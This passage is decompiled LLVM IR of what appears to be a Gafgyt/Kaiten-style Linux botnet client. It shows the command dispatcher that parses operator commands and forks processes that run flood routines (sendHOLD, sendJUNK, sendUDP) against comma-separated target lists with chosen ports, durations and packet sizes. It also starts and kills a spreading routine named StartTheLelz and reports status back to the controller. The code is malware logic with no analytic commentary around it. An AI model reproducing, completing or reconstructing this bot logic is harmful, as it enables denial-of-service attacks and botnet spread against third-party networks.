dec_label_pc_1000b468:                            ; preds = %dec_label_pc_1000b444
  %v3_1000b46c = icmp eq i32 %arg1, 2
  br i1 %v3_1000b46c, label %dec_label_pc_1000b494, label %dec_label_pc_1000b474

dec_label_pc_1000b474:                            ; preds = %dec_label_pc_1000b468
  %v3_1000b478 = load i32, i32* @global_var_1002c8e0.30, align 4
  store i32 ptrtoint (i32* @global_var_1000b490.947 to i32), i32* @lr, align 4
  %v4_1000b48c = call i32 @HackerPrint(i32 %v3_1000b478, i32 ptrtoint ([16 x i8]* @global_var_1001aac8.946 to i32), i32 268566528)
  br label %dec_label_pc_1000c690

dec_label_pc_1000b494:                            ; preds = %dec_label_pc_1000b468
  %v1_1000b498 = add i32 %tmp, 4
  %v1_1000b49c = inttoptr i32 %v1_1000b498 to i32*
  %v2_1000b49c = load i32, i32* %v1_1000b49c, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1001aad8.948 to i32), i32* @r4, align 4
  %v3_1000b4ac = inttoptr i32 %v2_1000b49c to i8*
  %v4_1000b4ac = call i32 @__GI_strcoll(i8* %v3_1000b4ac, i32 ptrtoint ([4 x i8]* @global_var_1001aad8.948 to i32))
  %v3_1000b4b4 = icmp eq i32 %v4_1000b4ac, 0
  br i1 %v3_1000b4b4, label %dec_label_pc_1000b4bc, label %dec_label_pc_1000b508

dec_label_pc_1000b4bc:                            ; preds = %dec_label_pc_1000b494
  %v3_1000b4c0 = load i32, i32* @global_var_1002c910.949, align 4
  %v3_1000b4c4 = icmp eq i32 %v3_1000b4c0, 0
  br i1 %v3_1000b4c4, label %dec_label_pc_1000c690, label %dec_label_pc_1000b4cc

dec_label_pc_1000b4cc:                            ; preds = %dec_label_pc_1000b4bc
  store i32 268481760, i32* @lr, align 4
  %v2_1000b4dc = call i32 @kill(i32 %v3_1000b4c0, i32 9)
  %v3_1000b4e4 = load i32, i32* @global_var_1002c8e0.30, align 4
  store i32 268481788, i32* @lr, align 4
  %v4_1000b4f8 = call i32 @HackerPrint(i32 %v3_1000b4e4, i32 ptrtoint ([5 x i8]* @global_var_1001aadc.950 to i32), i32 268566528)
  store i32 0, i32* @global_var_1002c910.949, align 4
  br label %dec_label_pc_1000b508

dec_label_pc_1000b508:                            ; preds = %dec_label_pc_1000b494, %dec_label_pc_1000b4cc
  %v2_1000b510 = load i32, i32* %v1_1000b49c, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001aae4.951 to i32), i32* @r4, align 4
  %v3_1000b520 = inttoptr i32 %v2_1000b510 to i8*
  %v4_1000b520 = call i32 @__GI_strcoll(i8* %v3_1000b520, i32 ptrtoint ([3 x i8]* @global_var_1001aae4.951 to i32))
  %v3_1000b528 = icmp eq i32 %v4_1000b520, 0
  br i1 %v3_1000b528, label %dec_label_pc_1000b530, label %dec_label_pc_1000b584

dec_label_pc_1000b530:                            ; preds = %dec_label_pc_1000b508
  %v3_1000b534 = load i32, i32* @global_var_1002c910.949, align 4
  %v3_1000b538 = icmp eq i32 %v3_1000b534, 0
  br i1 %v3_1000b538, label %dec_label_pc_1000b540, label %dec_label_pc_1000c690

dec_label_pc_1000b540:                            ; preds = %dec_label_pc_1000b530
  store i32 268481860, i32* @lr, align 4
  %v0_1000b540 = call i32 @__libc_fork()
  %v3_1000b550 = icmp eq i32 %v0_1000b540, 0
  br i1 %v3_1000b550, label %dec_label_pc_1000b568, label %dec_label_pc_1000b558

dec_label_pc_1000b558:                            ; preds = %dec_label_pc_1000b540
  store i32 %v0_1000b540, i32* @global_var_1002c910.949, align 4
  br label %dec_label_pc_1000c690

dec_label_pc_1000b568:                            ; preds = %dec_label_pc_1000b540
  %v1_1000b578 = call i32 @StartTheLelz(i32 -1)
  %v1_1000b580 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000b584

dec_label_pc_1000b584:                            ; preds = %dec_label_pc_1000b508, %dec_label_pc_1000b444, %dec_label_pc_1000b568
  %v2_1000b588 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1001aae8.953 to i32), i32* @r4, align 4
  %v3_1000b598 = inttoptr i32 %v2_1000b588 to i8*
  %v4_1000b598 = call i32 @__GI_strcoll(i8* %v3_1000b598, i32 ptrtoint ([6 x i8]* @global_var_1001aae8.953 to i32))
  %v3_1000b5a0 = icmp eq i32 %v4_1000b598, 0
  br i1 %v3_1000b5a0, label %dec_label_pc_1000b5a8, label %dec_label_pc_1000b604

dec_label_pc_1000b5a8:                            ; preds = %dec_label_pc_1000b584
  %v3_1000b5ac = icmp eq i32 %arg1, 2
  br i1 %v3_1000b5ac, label %dec_label_pc_1000b5b4, label %dec_label_pc_1000c690

dec_label_pc_1000b5b4:                            ; preds = %dec_label_pc_1000b5a8
  %v1_1000b5b8 = add i32 %tmp, 4
  %v1_1000b5bc = inttoptr i32 %v1_1000b5b8 to i32*
  %v2_1000b5bc = load i32, i32* %v1_1000b5bc, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001aae4.951 to i32), i32* @r4, align 4
  %v3_1000b5cc = inttoptr i32 %v2_1000b5bc to i8*
  %v4_1000b5cc = call i32 @__GI_strcoll(i8* %v3_1000b5cc, i32 ptrtoint ([3 x i8]* @global_var_1001aae4.951 to i32))
  %v3_1000b5d4 = icmp eq i32 %v4_1000b5cc, 0
  br i1 %v3_1000b5d4, label %dec_label_pc_1000b5dc, label %dec_label_pc_1000b604

dec_label_pc_1000b5dc:                            ; preds = %dec_label_pc_1000b5b4
  %v3_1000b5e0 = load i32, i32* @global_var_1002c8e0.30, align 4
  store i32 268482040, i32* @lr, align 4
  %v4_1000b5f4 = call i32 @HackerPrint(i32 %v3_1000b5e0, i32 ptrtoint ([25 x i8]* @global_var_1001aaf0.954 to i32), i32 268566528)
  %v1_1000b5f8 = call i32 @StartTheNetis(i32 %v4_1000b5f4)
  %v1_1000b600 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000b604

dec_label_pc_1000b604:                            ; preds = %dec_label_pc_1000b5b4, %dec_label_pc_1000b584, %dec_label_pc_1000b5dc
  %v2_1000b608 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1001ab0c.956 to i32), i32* @r4, align 4
  %v3_1000b618 = inttoptr i32 %v2_1000b608 to i8*
  %v4_1000b618 = call i32 @__GI_strcoll(i8* %v3_1000b618, i32 ptrtoint ([5 x i8]* @global_var_1001ab0c.956 to i32))
  %v3_1000b620 = icmp eq i32 %v4_1000b618, 0
  br i1 %v3_1000b620, label %dec_label_pc_1000b628, label %dec_label_pc_1000b774

dec_label_pc_1000b628:                            ; preds = %dec_label_pc_1000b604
  %tmp119 = icmp slt i32 %arg1, 4
  br i1 %tmp119, label %dec_label_pc_1000c690, label %dec_label_pc_1000b634

dec_label_pc_1000b634:                            ; preds = %dec_label_pc_1000b628
  %v1_1000b638 = add i32 %tmp, 8
  %v1_1000b63c = inttoptr i32 %v1_1000b638 to i32*
  %v2_1000b63c = load i32, i32* %v1_1000b63c, align 4
  store i32 268482120, i32* @lr, align 4
  %v2_1000b644 = call i32 @atol(i32 %v2_1000b63c, i32 %v1_1000b638)
  %tmp120 = icmp slt i32 %v2_1000b644, 1
  br i1 %tmp120, label %dec_label_pc_1000c690, label %dec_label_pc_1000b654

dec_label_pc_1000b654:                            ; preds = %dec_label_pc_1000b634
  %v1_1000b658 = add i32 %tmp, 12
  %v1_1000b65c = inttoptr i32 %v1_1000b658 to i32*
  %v2_1000b65c = load i32, i32* %v1_1000b65c, align 4
  store i32 268482152, i32* @lr, align 4
  %v2_1000b664 = call i32 @atol(i32 %v2_1000b65c, i32 %v1_1000b658)
  %v2_1000b66c = icmp sgt i32 %v2_1000b664, 0
  br i1 %v2_1000b66c, label %dec_label_pc_1000b678, label %dec_label_pc_1000c690

dec_label_pc_1000b678:                            ; preds = %dec_label_pc_1000b654
  %v1_1000b67c = add i32 %tmp, 4
  %v1_1000b680 = inttoptr i32 %v1_1000b67c to i32*
  %v2_1000b680 = load i32, i32* %v1_1000b680, align 4
  %v2_1000b690 = load i32, i32* %v1_1000b63c, align 4
  store i32 268482204, i32* @lr, align 4
  %v2_1000b698 = call i32 @atol(i32 %v2_1000b690, i32 %v1_1000b638)
  %v2_1000b6ac = load i32, i32* %v1_1000b65c, align 4
  store i32 268482232, i32* @lr, align 4
  %v2_1000b6b4 = call i32 @atol(i32 %v2_1000b6ac, i32 %v1_1000b658)
  store i32 %v2_1000b680, i32* @r3, align 4
  store i32 268482256, i32* @lr, align 4
  %v2_1000b6cc = call i32 @__GI_strchr(i32 %v2_1000b680, i32 44)
  %v3_1000b6d4 = icmp eq i32 %v2_1000b6cc, 0
  br i1 %v3_1000b6d4, label %dec_label_pc_1000b74c, label %dec_label_pc_1000b6dc

dec_label_pc_1000b6dc:                            ; preds = %dec_label_pc_1000b678
  store i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32* @r4, align 4
  store i32 268482288, i32* @lr, align 4
  %v3_1000b6ec = call i32 @__GI_strtok(i32 %v2_1000b680, i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32 268566528)
  %v3_1000b74058 = icmp eq i32 %v3_1000b6ec, 0
  br i1 %v3_1000b74058, label %dec_label_pc_1000b774, label %dec_label_pc_1000b6fc

dec_label_pc_1000b6fc:                            ; preds = %dec_label_pc_1000b6dc, %dec_label_pc_1000b724
  %storemerge2859 = phi i32 [ %v3_1000b730, %dec_label_pc_1000b724 ], [ %v3_1000b6ec, %dec_label_pc_1000b6dc ]
  store i32 268482304, i32* @lr, align 4
  %v0_1000b6fc = call i32 @listFork()
  %v3_1000b704 = icmp eq i32 %v0_1000b6fc, 0
  br i1 %v3_1000b704, label %dec_label_pc_1000b70c, label %dec_label_pc_1000b724

dec_label_pc_1000b70c:                            ; preds = %dec_label_pc_1000b6fc
  %v3_1000b718 = call i32 @sendHOLD(i32 %storemerge2859, i32 %v2_1000b698, i32 %v2_1000b6b4)
  %v1_1000b720 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000b724

dec_label_pc_1000b724:                            ; preds = %dec_label_pc_1000b6fc, %dec_label_pc_1000b70c
  store i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32* @r4, align 4
  store i32 268482356, i32* @lr, align 4
  %v3_1000b730 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32 268566528)
  %v3_1000b740 = icmp eq i32 %v3_1000b730, 0
  br i1 %v3_1000b740, label %dec_label_pc_1000b774, label %dec_label_pc_1000b6fc

dec_label_pc_1000b74c:                            ; preds = %dec_label_pc_1000b678
  store i32 268482384, i32* @lr, align 4
  %v0_1000b74c = call i32 @listFork()
  %v3_1000b754 = icmp eq i32 %v0_1000b74c, 0
  br i1 %v3_1000b754, label %dec_label_pc_1000b75c, label %dec_label_pc_1000c690

dec_label_pc_1000b75c:                            ; preds = %dec_label_pc_1000b74c
  %v3_1000b768 = call i32 @sendHOLD(i32 %v2_1000b680, i32 %v2_1000b698, i32 %v2_1000b6b4)
  %v1_1000b770 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000b774

dec_label_pc_1000b774:                            ; preds = %dec_label_pc_1000b724, %dec_label_pc_1000b6dc, %dec_label_pc_1000b604, %dec_label_pc_1000b75c
  %v2_1000b778 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1001ab14.960 to i32), i32* @r4, align 4
  %v3_1000b788 = inttoptr i32 %v2_1000b778 to i8*
  %v4_1000b788 = call i32 @__GI_strcoll(i8* %v3_1000b788, i32 ptrtoint ([5 x i8]* @global_var_1001ab14.960 to i32))
  %v3_1000b790 = icmp eq i32 %v4_1000b788, 0
  br i1 %v3_1000b790, label %dec_label_pc_1000b798, label %dec_label_pc_1000b8f4

dec_label_pc_1000b798:                            ; preds = %dec_label_pc_1000b774
  %tmp121 = icmp slt i32 %arg1, 4
  br i1 %tmp121, label %dec_label_pc_1000c690, label %dec_label_pc_1000b7a4

dec_label_pc_1000b7a4:                            ; preds = %dec_label_pc_1000b798
  %v1_1000b7a8 = add i32 %tmp, 8
  %v1_1000b7ac = inttoptr i32 %v1_1000b7a8 to i32*
  %v2_1000b7ac = load i32, i32* %v1_1000b7ac, align 4
  store i32 268482488, i32* @lr, align 4
  %v2_1000b7b4 = call i32 @atol(i32 %v2_1000b7ac, i32 %v1_1000b7a8)
  %tmp122 = icmp slt i32 %v2_1000b7b4, 1
  br i1 %tmp122, label %dec_label_pc_1000c690, label %dec_label_pc_1000b7c4

dec_label_pc_1000b7c4:                            ; preds = %dec_label_pc_1000b7a4
  %v1_1000b7c8 = add i32 %tmp, 12
  %v1_1000b7cc = inttoptr i32 %v1_1000b7c8 to i32*
  %v2_1000b7cc = load i32, i32* %v1_1000b7cc, align 4
  store i32 268482520, i32* @lr, align 4
  %v2_1000b7d4 = call i32 @atol(i32 %v2_1000b7cc, i32 %v1_1000b7c8)
  %v2_1000b7dc = icmp sgt i32 %v2_1000b7d4, 0
  br i1 %v2_1000b7dc, label %dec_label_pc_1000b7e8, label %dec_label_pc_1000c690

dec_label_pc_1000b7e8:                            ; preds = %dec_label_pc_1000b7c4
  %v1_1000b7ec = add i32 %tmp, 4
  %v1_1000b7f0 = inttoptr i32 %v1_1000b7ec to i32*
  %v2_1000b7f0 = load i32, i32* %v1_1000b7f0, align 4
  %v2_1000b800 = load i32, i32* %v1_1000b7ac, align 4
  store i32 268482572, i32* @lr, align 4
  %v2_1000b808 = call i32 @atol(i32 %v2_1000b800, i32 %v1_1000b7a8)
  %v2_1000b81c = load i32, i32* %v1_1000b7cc, align 4
  store i32 268482600, i32* @lr, align 4
  %v2_1000b824 = call i32 @atol(i32 %v2_1000b81c, i32 %v1_1000b7c8)
  store i32 %v2_1000b7f0, i32* @r3, align 4
  store i32 268482624, i32* @lr, align 4
  %v2_1000b83c = call i32 @__GI_strchr(i32 %v2_1000b7f0, i32 44)
  %v3_1000b844 = icmp eq i32 %v2_1000b83c, 0
  br i1 %v3_1000b844, label %dec_label_pc_1000b8cc, label %dec_label_pc_1000b84c

dec_label_pc_1000b84c:                            ; preds = %dec_label_pc_1000b7e8
  store i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32* @r4, align 4
  store i32 268482656, i32* @lr, align 4
  %v3_1000b85c = call i32 @__GI_strtok(i32 %v2_1000b7f0, i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32 268566528)
  %v3_1000b8c054 = icmp eq i32 %v3_1000b85c, 0
  br i1 %v3_1000b8c054, label %dec_label_pc_1000b8f4, label %dec_label_pc_1000b86c

dec_label_pc_1000b86c:                            ; preds = %dec_label_pc_1000b84c, %dec_label_pc_1000b8a4
  %storemerge2655 = phi i32 [ %v3_1000b8b0, %dec_label_pc_1000b8a4 ], [ %v3_1000b85c, %dec_label_pc_1000b84c ]
  store i32 268482672, i32* @lr, align 4
  %v0_1000b86c = call i32 @listFork()
  %v3_1000b874 = icmp eq i32 %v0_1000b86c, 0
  br i1 %v3_1000b874, label %dec_label_pc_1000b87c, label %dec_label_pc_1000b8a4

dec_label_pc_1000b87c:                            ; preds = %dec_label_pc_1000b86c
  %v3_1000b888 = call i32 @sendJUNK(i32 %storemerge2655, i32 %v2_1000b808, i32 %v2_1000b824)
  %v3_1000b890 = load i32, i32* @global_var_1002c8e0.30, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000b89c.961 to i32), i32* @lr, align 4
  %v1_1000b898 = call i32 @__libc_close(i32 %v3_1000b890)
  %v1_1000b8a0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000b8a4

dec_label_pc_1000b8a4:                            ; preds = %dec_label_pc_1000b86c, %dec_label_pc_1000b87c
  store i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32* @r4, align 4
  store i32 268482740, i32* @lr, align 4
  %v3_1000b8b0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32 268566528)
  %v3_1000b8c0 = icmp eq i32 %v3_1000b8b0, 0
  br i1 %v3_1000b8c0, label %dec_label_pc_1000b8f4, label %dec_label_pc_1000b86c

dec_label_pc_1000b8cc:                            ; preds = %dec_label_pc_1000b7e8
  store i32 268482768, i32* @lr, align 4
  %v0_1000b8cc = call i32 @listFork()
  %v3_1000b8d4 = icmp eq i32 %v0_1000b8cc, 0
  br i1 %v3_1000b8d4, label %dec_label_pc_1000b8dc, label %dec_label_pc_1000c690

dec_label_pc_1000b8dc:                            ; preds = %dec_label_pc_1000b8cc
  %v3_1000b8e8 = call i32 @sendJUNK(i32 %v2_1000b7f0, i32 %v2_1000b808, i32 %v2_1000b824)
  %v1_1000b8f0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000b8f4

dec_label_pc_1000b8f4:                            ; preds = %dec_label_pc_1000b8a4, %dec_label_pc_1000b84c, %dec_label_pc_1000b774, %dec_label_pc_1000b8dc
  %v2_1000b8f8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1001ab1c.964 to i32), i32* @r4, align 4
  %v3_1000b908 = inttoptr i32 %v2_1000b8f8 to i8*
  %v4_1000b908 = call i32 @__GI_strcoll(i8* %v3_1000b908, i32 ptrtoint ([4 x i8]* @global_var_1001ab1c.964 to i32))
  %v3_1000b910 = icmp eq i32 %v4_1000b908, 0
  br i1 %v3_1000b910, label %dec_label_pc_1000b918, label %dec_label_pc_1000bbb0

dec_label_pc_1000b918:                            ; preds = %dec_label_pc_1000b8f4
  %tmp123 = icmp slt i32 %arg1, 6
  br i1 %tmp123, label %dec_label_pc_1000c690, label %dec_label_pc_1000b924

dec_label_pc_1000b924:                            ; preds = %dec_label_pc_1000b918
  %v1_1000b928 = add i32 %tmp, 12
  %v1_1000b92c = inttoptr i32 %v1_1000b928 to i32*
  %v2_1000b92c = load i32, i32* %v1_1000b92c, align 4
  store i32 268482872, i32* @lr, align 4
  %v2_1000b934 = call i32 @atol(i32 %v2_1000b92c, i32 %v1_1000b928)
  %v4_1000b940 = icmp eq i32 %v2_1000b934, -1
  br i1 %v4_1000b940, label %dec_label_pc_1000c690, label %dec_label_pc_1000b948

dec_label_pc_1000b948:                            ; preds = %dec_label_pc_1000b924
  %v1_1000b94c = add i32 %tmp, 8
  %v1_1000b950 = inttoptr i32 %v1_1000b94c to i32*
  %v2_1000b950 = load i32, i32* %v1_1000b950, align 4
  store i32 268482908, i32* @lr, align 4
  %v2_1000b958 = call i32 @atol(i32 %v2_1000b950, i32 %v1_1000b94c)
  %v4_1000b964 = icmp eq i32 %v2_1000b958, -1
  br i1 %v4_1000b964, label %dec_label_pc_1000c690, label %dec_label_pc_1000b96c

dec_label_pc_1000b96c:                            ; preds = %dec_label_pc_1000b948
  %v1_1000b970 = add i32 %tmp, 16
  %v1_1000b974 = inttoptr i32 %v1_1000b970 to i32*
  %v2_1000b974 = load i32, i32* %v1_1000b974, align 4
  store i32 268482944, i32* @lr, align 4
  %v2_1000b97c = call i32 @atol(i32 %v2_1000b974, i32 %v1_1000b970)
  %v4_1000b988 = icmp eq i32 %v2_1000b97c, -1
  br i1 %v4_1000b988, label %dec_label_pc_1000c690, label %dec_label_pc_1000b990

dec_label_pc_1000b990:                            ; preds = %dec_label_pc_1000b96c
  %v1_1000b994 = add i32 %tmp, 20
  %v1_1000b998 = inttoptr i32 %v1_1000b994 to i32*
  %v2_1000b998 = load i32, i32* %v1_1000b998, align 4
  store i32 268482980, i32* @lr, align 4
  %v2_1000b9a0 = call i32 @atol(i32 %v2_1000b998, i32 %v1_1000b994)
  %v4_1000b9ac = icmp eq i32 %v2_1000b9a0, -1
  br i1 %v4_1000b9ac, label %dec_label_pc_1000c690, label %dec_label_pc_1000b9b4

dec_label_pc_1000b9b4:                            ; preds = %dec_label_pc_1000b990
  %v2_1000b9bc = load i32, i32* %v1_1000b998, align 4
  store i32 268483016, i32* @lr, align 4
  %v2_1000b9c4 = call i32 @atol(i32 %v2_1000b9bc, i32 %v1_1000b994)
  %v3_1000b9d4 = icmp sgt i32 %v2_1000b9c4, 65500
  br i1 %v3_1000b9d4, label %dec_label_pc_1000c690, label %dec_label_pc_1000b9dc

dec_label_pc_1000b9dc:                            ; preds = %dec_label_pc_1000b9b4
  %v2_1000b9e4 = load i32, i32* %v1_1000b974, align 4
  store i32 268483056, i32* @lr, align 4
  %v2_1000b9ec = call i32 @atol(i32 %v2_1000b9e4, i32 %v1_1000b970)
  %v2_1000b9f4 = icmp sgt i32 %v2_1000b9ec, 32
  br i1 %v2_1000b9f4, label %dec_label_pc_1000c690, label %dec_label_pc_1000b9fc

dec_label_pc_1000b9fc:                            ; preds = %dec_label_pc_1000b9dc
  %v3_1000ba00 = icmp eq i32 %arg1, 7
  br i1 %v3_1000ba00, label %dec_label_pc_1000ba08, label %dec_label_pc_1000ba2c

dec_label_pc_1000ba08:                            ; preds = %dec_label_pc_1000b9fc
  %v1_1000ba0c = add i32 %tmp, 24
  %v1_1000ba10 = inttoptr i32 %v1_1000ba0c to i32*
  %v2_1000ba10 = load i32, i32* %v1_1000ba10, align 4
  store i32 268483100, i32* @lr, align 4
  %v2_1000ba18 = call i32 @atol(i32 %v2_1000ba10, i32 %v1_1000ba0c)
  %v2_1000ba20 = icmp sgt i32 %v2_1000ba18, 0
  br i1 %v2_1000ba20, label %dec_label_pc_1000ba2c, label %dec_label_pc_1000c690

dec_label_pc_1000ba2c:                            ; preds = %dec_label_pc_1000b9fc, %dec_label_pc_1000ba08
  %v1_1000ba30 = add i32 %tmp, 4
  %v1_1000ba34 = inttoptr i32 %v1_1000ba30 to i32*
  %v2_1000ba34 = load i32, i32* %v1_1000ba34, align 4
  %v2_1000ba44 = load i32, i32* %v1_1000b950, align 4
  store i32 268483152, i32* @lr, align 4
  %v2_1000ba4c = call i32 @atol(i32 %v2_1000ba44, i32 %v1_1000b94c)
  %v2_1000ba60 = load i32, i32* %v1_1000b92c, align 4
  store i32 268483180, i32* @lr, align 4
  %v2_1000ba68 = call i32 @atol(i32 %v2_1000ba60, i32 %v1_1000b928)
  %v2_1000ba7c = load i32, i32* %v1_1000b974, align 4
  store i32 268483208, i32* @lr, align 4
  %v2_1000ba84 = call i32 @atol(i32 %v2_1000ba7c, i32 %v1_1000b970)
  %v2_1000ba98 = load i32, i32* %v1_1000b998, align 4
  store i32 268483236, i32* @lr, align 4
  %v2_1000baa0 = call i32 @atol(i32 %v2_1000ba98, i32 %v1_1000b994)
  br i1 %v3_1000ba00, label %dec_label_pc_1000bab8, label %dec_label_pc_1000bad4

dec_label_pc_1000bab8:                            ; preds = %dec_label_pc_1000ba2c
  %v1_1000babc = add i32 %tmp, 24
  %v1_1000bac0 = inttoptr i32 %v1_1000babc to i32*
  %v2_1000bac0 = load i32, i32* %v1_1000bac0, align 4
  store i32 268483276, i32* @lr, align 4
  %v2_1000bac8 = call i32 @atol(i32 %v2_1000bac0, i32 %v1_1000babc)
  br label %dec_label_pc_1000badc

dec_label_pc_1000bad4:                            ; preds = %dec_label_pc_1000ba2c
  br label %dec_label_pc_1000badc

dec_label_pc_1000badc:                            ; preds = %dec_label_pc_1000bab8, %dec_label_pc_1000bad4
  %storemerge9 = phi i32 [ 10, %dec_label_pc_1000bad4 ], [ %v2_1000bac8, %dec_label_pc_1000bab8 ]
  store i32 %v2_1000ba34, i32* @r3, align 4
  store i32 268483316, i32* @lr, align 4
  %v2_1000baf0 = call i32 @__GI_strchr(i32 %v2_1000ba34, i32 44)
  %v3_1000baf8 = icmp eq i32 %v2_1000baf0, 0
  br i1 %v3_1000baf8, label %dec_label_pc_1000bb7c, label %dec_label_pc_1000bb00

dec_label_pc_1000bb00:                            ; preds = %dec_label_pc_1000badc
  store i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32* @r4, align 4
  store i32 268483348, i32* @lr, align 4
  %v3_1000bb10 = call i32 @__GI_strtok(i32 %v2_1000ba34, i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32 268566528)
  %v3_1000bb7050 = icmp eq i32 %v3_1000bb10, 0
  br i1 %v3_1000bb7050, label %dec_label_pc_1000bbb0, label %dec_label_pc_1000bb20

dec_label_pc_1000bb20:                            ; preds = %dec_label_pc_1000bb00, %dec_label_pc_1000bb54
  %storemerge2451 = phi i32 [ %v3_1000bb60, %dec_label_pc_1000bb54 ], [ %v3_1000bb10, %dec_label_pc_1000bb00 ]
  store i32 268483364, i32* @lr, align 4
  %v0_1000bb20 = call i32 @listFork()
  %v3_1000bb28 = icmp eq i32 %v0_1000bb20, 0
  br i1 %v3_1000bb28, label %dec_label_pc_1000bb30, label %dec_label_pc_1000bb54

dec_label_pc_1000bb30:                            ; preds = %dec_label_pc_1000bb20
  %v6_1000bb48 = call i32 @sendUDP(i32 %storemerge2451, i32 %v2_1000ba4c, i32 %v2_1000ba68, i32 %v2_1000ba84, i32 %v2_1000baa0, i32 %storemerge9)
  %v1_1000bb50 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000bb54

dec_label_pc_1000bb54:                            ; preds = %dec_label_pc_1000bb20, %dec_label_pc_1000bb30
  store i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32* @r4, align 4
  store i32 268483428, i32* @lr, align 4
  %v3_1000bb60 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32 268566528)
  %v3_1000bb70 = icmp eq i32 %v3_1000bb60, 0
  br i1 %v3_1000bb70, label %dec_label_pc_1000bbb0, label %dec_label_pc_1000bb20

dec_label_pc_1000bb7c:                            ; preds = %dec_label_pc_1000badc
  store i32 268483456, i32* @lr, align 4
  %v0_1000bb7c = call i32 @listFork()
  %v3_1000bb84 = icmp eq i32 %v0_1000bb7c, 0
  br i1 %v3_1000bb84, label %dec_label_pc_1000bb8c, label %dec_label_pc_1000c690

dec_label_pc_1000bb8c:                            ; preds = %dec_label_pc_1000bb7c
  %v6_1000bba4 = call i32 @sendUDP(i32 %v2_1000ba34, i32 %v2_1000ba4c, i32 %v2_1000ba68, i32 %v2_1000ba84, i32 %v2_1000baa0, i32 %storemerge9)
  %v1_1000bbac = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000bbb0

dec_label_pc_1000bbb0:                            ; preds = %dec_label_pc_1000bb54, %dec_label_pc_1000bb00, %dec_label_pc_1000b8f4, %dec_label_pc_1000bb8c
  %v2_1000bbb4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1001ab20.968 to i32), i32* @r4, align 4
  %v3_1000bbc4 = inttoptr i32 %v2_1000bbb4 to i8*
  %v4_1000bbc4 = call i32 @__GI_strcoll(i8* %v3_1000bbc4, i32 ptrtoint ([5 x i8]* @global_var_1001ab20.968 to i32))
  %v3_1000bbcc = icmp eq i32 %v4_1000bbc4, 0
  br i1 %v3_1000bbcc, label %dec_label_pc_1000bbd4, label %dec_label_pc_1000bdb4

dec_label_pc_1000bbd4:                            ; preds = %dec_label_pc_1000bbb0
  %tmp124 = icmp slt i32 %arg1, 6
  br i1 %tmp124, label %dec_label_pc_1000c690, label %dec_label_pc_1000bbe0

dec_label_pc_1000bbe0:                            ; preds = %dec_label_pc_1000bbd4
  %v1_1000bbe4 = add i32 %tmp, 4
  %v1_1000bbe8 = inttoptr i32 %v1_1000bbe4 to i32*
  %v2_1000bbe8 = load i32, i32* %v1_1000bbe8, align 4
  store i32 %v2_1000bbe8, i32* @r3, align 4
  store i32 268483576, i32* @lr, align 4
  %v2_1000bbf4 = call i32 @__GI_strchr(i32 %v2_1000bbe8, i32 44)
  %v3_1000bbfc = icmp eq i32 %v2_1000bbf4, 0
  br i1 %v3_1000bbfc, label %dec_label_pc_1000bd04, label %dec_label_pc_1000bc04

dec_label_pc_1000bc04:                            ; preds = %dec_label_pc_1000bbe0
  %v2_1000bc0c = load i32, i32* %v1_1000bbe8, align 4
  store i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32* @r4, align 4
  store i32 268483616, i32* @lr, align 4
  %v3_1000bc1c = call i32 @__GI_strtok(i32 %v2_1000bc0c, i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32 268566528)
  %v3_1000bcf847 = icmp eq i32 %v3_1000bc1c, 0
  br i1 %v3_1000bcf847, label %dec_label_pc_1000bdb4, label %dec_label_pc_1000bc2c.lr.ph

dec_label_pc_1000bc2c.lr.ph:                      ; preds = %dec_label_pc_1000bc04
  %v1_1000bc60 = add i32 %tmp, 12
  %v1_1000bc64 = inttoptr i32 %v1_1000bc60 to i32*
  %v1_1000bc8c = add i32 %tmp, 20
  %v1_1000bc90 = inttoptr i32 %v1_1000bc8c to i32*
  %v1_1000bca4 = add i32 %tmp, 24
  %v1_1000bca8 = inttoptr i32 %v1_1000bca4 to i32*
  br label %dec_label_pc_1000bc2c

dec_label_pc_1000bc2c:                            ; preds = %dec_label_pc_1000bc2c.lr.ph, %dec_label_pc_1000bcdc
  store i32 268483632, i32* @lr, align 4
  %v0_1000bc2c = call i32 @listFork()
  %v3_1000bc34 = icmp eq i32 %v0_1000bc2c, 0
  br i1 %v3_1000bc34, label %dec_label_pc_1000bc3c, label %dec_label_pc_1000bcdc

dec_label_pc_1000bc3c:                            ; preds = %dec_label_pc_1000bc2c
  %v2_1000bc44 = load i32, i32* %v1_1000bbe8, align 4
  store i32 %v2_1000bc44, i32* @r29, align 4
  %v2_1000bc64 = load i32, i32* %v1_1000bc64, align 4
  store i32 268483696, i32* @lr, align 4
  %v2_1000bc6c = call i32 @atol(i32 %v2_1000bc64, i32 %v1_1000bc60)
  %v1_1000bc74 = urem i32 %v2_1000bc6c, 65536
